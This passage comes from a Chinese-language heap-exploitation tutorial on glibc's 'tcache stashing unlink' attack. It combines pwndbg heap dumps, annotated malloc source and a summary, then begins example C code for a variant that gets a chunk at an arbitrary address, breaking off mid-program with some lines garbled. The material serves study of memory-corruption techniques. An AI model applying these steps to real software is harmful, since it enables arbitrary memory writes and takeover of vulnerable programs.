    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x555555559950 (size : 0x206b0) 
           last_remainder: 0x0 (size : 0x0) 
                unsortbin: 0x5555555594f0 (size : 0x430)
        malloc(0x3c0);
        printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
        malloc(0x100);
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x555555559950 (size : 0x206b0) 
           last_remainder: 0x5555555598c0 (size : 0x60) 
                unsortbin: 0x5555555598c0 (size : 0x60)
    (0x60)   tcache_entry[4](6): 0x5555555594a0 --> 0x555555559440 --> 0x5555555593e0 --> 0x555555559380 --> 0x555555559320 --> 0x5555555592c0
可以看到0x5555555598c0是在`last_remainder`之中的，由于其不会进入tcache的特性，就可以进入到smallbin中。
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x555555559a60 (size : 0x205a0) 
           last_remainder: 0x5555555598c0 (size : 0x60) 
                unsortbin: 0x0
    (0x060)  smallbin[ 4]: 0x5555555598c0
    (0x60)   tcache_entry[4](6): 0x5555555594a0 --> 0x555555559440 --> 0x5555555593e0 --> 0x555555559380 --> 0x555555559320 --> 0x5555555592c0
接着重复这个步骤，在构造一个进入smallbin的chunk。
        printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
        printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
        s2 = malloc(0x420);
        pad = malloc(0x80); //防止合并的pad chunk，其必须大于0x60
        free(s2);
        malloc(0x3c0);
        malloc(0x100);
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x55555555a030 (size : 0x1ffd0) 
           last_remainder: 0x555555559e30 (size : 0x60) 
                unsortbin: 0x0
    (0x060)  smallbin[ 4]: 0x555555559e30   0x5555555598c0
    (0x60)   tcache_entry[4](6): 0x5555555594a0 --> 0x555555559440 --> 0x5555555593e0 --> 0x555555559380 --> 0x555555559320 --> 0x5555555592c0
可以看到已经完成构造了。接着进行change 0x555555559e30 的bk为目标地址-0x10。
    *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&victim)-0x10;
原始：
    pwndbg> x/30gx 0x555555559e30
    0x555555559e30: 0x0000000000000000      0x0000000000000061
    0x555555559e40: 0x00005555555598c0      0x00007ffff7fb9c30
change 后：
    pwndbg> x/30gx 0x555555559e30
    0x555555559e30: 0x0000000000000000      0x0000000000000061
    0x555555559e40: 0x00005555555598c0      0x0000555555558040
    0x555555559e50: 0x0000000000000000      0x0000000000000000
再看下即将被calloc申请到的smallbin：
    pwndbg> x/30gx 0x5555555598c0
    0x5555555598c0: 0x0000000000000000      0x0000000000000061
    0x5555555598d0: 0x00007ffff7fb9c30      0x0000555555559e30
        calloc(1, 0x50);
其先会进行一个解链：
     if (in_smallbin_range (nb))
        {
          idx = smallbin_index (nb);
          bin = bin_at (av, idx);
          if ((victim = last (bin)) != bin)
            {
              bck = victim->bk; //1
          if (__glibc_unlikely (bck->fd != victim)) //2 明显是可以通过其双向链表的检查，会被正常的解链
            malloc_printerr ("malloc(): smallbin double linked list corrupted");
              set_inuse_bit_at_offset (victim, nb);
              bin->bk = bck;
              bck->fd = bin;
              if (av != &main_arena)
            set_non_main_arena (victim);
              check_malloced_chunk (av, victim, nb);
接着会进行stash：
    #if USE_TCACHE
          /* While we're here, if we see other chunks of the same size,
             stash them in the tcache.  */
          size_t tc_idx = csize2tidx (nb);
          if (tcache && tc_idx counts[tc_idx] bk;
                  set_inuse_bit_at_offset (tc_victim, nb);
                  if (av != &main_arena)
                set_non_main_arena (tc_victim);
                  bin->bk = bck;
                  bck->fd = bin;
                  tcache_put (tc_victim, tc_idx);
                    }
            }
可以看到这一块，并没有进行双向链表的检查。其中`bck->fd = bin;`这个也就是对于 (&tag – 0x10) + 0x10 =
bin。也就是将目标地址上的值赋为 bin，这样就实现了等价于 unsortedbin Attack 的操作。
    pwndbg> x/30gx 0x0000555555558050
    0x555555558050 :        0x00007ffff7fb9c30      0x0000000000000000
可以看到攻击已经成功。
    0x60)   tcache_entry[4](7): 0x555555559e40 --> 0x5555555594a0 --> 0x555555559440 --> 0x5555555593e0 --> 0x555555559380 --> 0x555555559320 --> 0x5555555592c0
且已经满chain，结束了stash的过程。
需要注意的是，刚才描述的放入过程是一个循环，我们将伪造的bck看成一个堆块，其bk很可能是一个非法的地址，这样就导致循环到下一个堆块时unlink执行到`bck->fd
= bin;`访问非法内存造成程序crash。所以开始，选择释放6个对应size的chunk到tcache
bin，只为tcache留一个空间，这样循环一次就会跳出，不会有后续问题。
####  小总结
  * 先放入 2 个 Chunk 到 smallbins，6 个 Chunk 到对应的 tcache；
  * 然后在不破坏 fd 的情况下,将后放入 smallbins 的 chunk 的 bk 设置为目标地址减 0x10。
  * 这样再用calloc向 smallbins 申请对应大小的 Chunk 时，先放入 smallbins 的 Chunk 被分配给用户，然后触发 stash 机制。`bck = tc_victim->bk;`此时的 bck 就是目标地址减 0x10，之后`bck->fd = bin;` 也就是将目标地址上的值赋为 bin，写上了`main_arena`的地址，这样就实现了等价于 unsortedbin attack 的操作；
  * 之后再调用 `tcache_put` 把后放入 smallbins 的 Chunk 取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 Chunk，在这次之后达到了阈值，所以也就退出了 stash 循环，整个流程就会正常结束。
### `tcache_stashing_unlink plus`
####  示例代码
    #include 
    #include 
    #include 
    static uint64_t victim[4] = {0, 0, 0, 0};
    int main(int argc, char **argv){
        setbuf(stdout, 0);
        setbuf(stderr, 0);
        char *t1;
        char *s1, *s2, *pad;
        char *tmp;
        printf("You can use this technique to get a tcache chunk to arbitrary address\n");
        printf("\n1. need to know heap address and the victim address that you need to attack\n");
        tmp = malloc(0x1);
        printf("victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
            &victim, victim[0], victim[1], victim[2], victim[3]);
        printf("heap address: %p\n", tmp-0x260);
        printf("\n2. change victim's data, make victim[1] = &victim, or other address to writable address\n");
        //只要是一个可以写的指针地址即可，不一定是&victim
        victim[1] = (uint64_t)(&victim);
        printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
            victim[0], victim[1], victim[2], victim[3]);
        printf("\n3. choose a stable size and free five identical size chunks to tcache_entry list\n");
        printf("Here, I choose the size 0x60\n");
        for(int i=0; i %p --> %p --> %p --> %p\n", 
            t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);
        printf("\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");
        s1 = malloc(0x420);
        printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
        pad = malloc(0x20);
        printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
        free(s1);
        printf("Free chunk %p to unsortedbin\n", s1);
        malloc(0x3c0);
        printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
        malloc(0x100);
        printf("Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
        printf("chunk %p is in smallbin[4], whose size is 0x60\n", s1+0x3c0);
        printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
        printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
        s2 = malloc(0x420);
        pad = malloc(0x80);
        free(s2);
        malloc(0x3c0);
        malloc(0x100);
        printf("chunk %p is in smallbin[4], whose size is 0x60\n", s2+0x3c0);
        printf("smallbin[4] list is %p  %p\n", s2+0x3c0, s1+0x3c0);